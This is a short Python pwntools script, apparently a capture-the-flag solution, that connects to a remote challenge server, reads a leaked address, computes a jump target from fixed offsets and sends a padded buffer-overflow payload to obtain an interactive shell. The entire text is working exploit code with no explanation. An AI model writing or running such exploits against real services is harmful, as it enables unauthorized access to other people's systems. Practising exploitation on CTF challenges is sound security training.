from pwn import *
from struct import *

r=remote("ctf.j0n9hyun.xyz", 3008)
print r.recvuntil("is ")

addr = int(r.recv(10),16)

log.info("welcome: %#x",addr)
libc = addr - 0x909
sh = libc + 0x890

log.info("libc :%#x",libc)
payload = "a"*22 + p32(sh)

r.send(payload)
r.interactive()
